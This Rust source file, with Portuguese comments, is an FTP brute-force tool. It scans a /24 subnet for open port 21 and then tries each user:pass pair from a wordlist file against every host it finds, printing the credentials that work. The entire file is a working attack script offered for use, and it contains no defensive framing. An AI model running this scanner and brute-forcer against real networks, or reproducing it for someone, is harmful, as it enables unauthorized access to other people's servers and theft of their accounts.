

use std::process::exit;
use std::fs::read_to_string;
use std::time::Duration;
use std::env;
use std::net::{ToSocketAddrs,TcpStream};
use std::thread;
use ftp::FtpStream;
use colored::*;



pub struct UserAndPass{
    pub user: String,
    pub pass: String,
}

impl  UserAndPass {
    pub fn new(user: String,pass: String) -> UserAndPass {
        UserAndPass{user,pass}
    }    
}
static mut Host: Vec<String> = Vec::new();
static Port: i32 = 21; // ftp port
static range: i32 = 255; // Classe C /* Se vc aumentar o range de ip o codigo pode dar error  */
fn main() {
    
     if let Some(Valor) = ReadArq("senha.txt") {
        // Logica no loop

        unsafe {
            let args: Vec<String> = env::args().collect();
            if args.len() != 2{
                println!("./code Ip");
                exit(0x232);
            }

            // Code run
            let host: Vec<&str>  = args[1].as_str().split(".").collect();
            if host.len() != 4 {
                println!("./code host Ip");
                exit(0xf32);
            }
            // Convert Vec<i32> 
            let host_int: Vec<i32> = host
            .iter()
            .map(|&s| {
                s.parse::<i32>().unwrap_or_else(|_| {
                    eprintln!("Host not exist");
                    exit(0xf21);
                })
            })
            .collect();
            
            for cont in 0..range + 1 {
                let Hostativo = format!("{}.{}.{}.{}", host_int[0], host_int[1],host_int[2], cont);
                let _ = Hostativo.as_str();
                
                if let Some(_) = checkHostPort(Hostativo.to_string()){
                    Host.push(Hostativo.to_string());
                }
                else {
                    print!("Port 21 Off : {}", Hostativo.red());
                    std::io::Write::flush(&mut std::io::stdout()).unwrap(); 
                    
                    print!("\r"); 
                    continue;
                }
                
                
            }
            print!("\x1B[2J\x1B[1;1H");

            {   
                if Host.len() < 1 {
                    println!("Nenhum Host 21 open");
                    exit(2);
                }
                readLines(Valor);
            }


        }
    }
    else {
        println!("arquivo off");
        exit(1);
    }
}


fn ReadArq(filename: &str)  -> Option<String> {

    if let Ok(buffer_arq) = read_to_string(filename){
        return  Some(buffer_arq.trim().to_string())
    }
    None
}

fn checkHostPort(host: String) -> Option<()>{

    let addr = format!("{}:{}",host,Port);
    
    if let Ok(_) = TcpStream::connect_timeout(&addr.to_socket_addrs().unwrap().next().unwrap(), Duration::from_millis(50)) {
        return Some(());
    }
    
    None

}

fn BruteForce(host: &str, login: &UserAndPass)  {
    let mut ftp_stream = FtpStream::connect(format!("{}:{}", host, Port));
   
    if let Err(_) = ftp_stream {
       
    }
    else {
        if let Ok(mut Valor) = ftp_stream{
            if let Ok(a) = Valor.login(&login.user , &login.pass){
                println!("Acept: {} > User:  {} and Pass: {}\n", host.yellow(),&login.user.on_blue(), login.pass.green());
                Valor.quit();
        }
    }
  
   
    }
}
fn readLines(lines: String){
    for linha in lines.lines(){

        let splitLines: Vec<&str> = linha.split(":").collect();
        if splitLines.len() < 2 {
            continue;
        }
        else if splitLines.len() as u8 == 2 as u8 {
            let user = splitLines[0];
            let pass = splitLines[1];
            let info = UserAndPass{user: user.to_string(),pass: pass.to_string()};
        
            unsafe {

                for ip in &Host{
                    print!("Host:  {} User:  {}  Pass:  {} ", ip, &info.user, &info.pass);
                    thread::sleep(Duration::from_millis(50));
                    std::io::Write::flush(&mut std::io::stdout()).unwrap(); 
                    
                    print!("\r"); 
                    
                    BruteForce(ip.as_str(), &info);
                }

            }
        }
        
      
    }
}



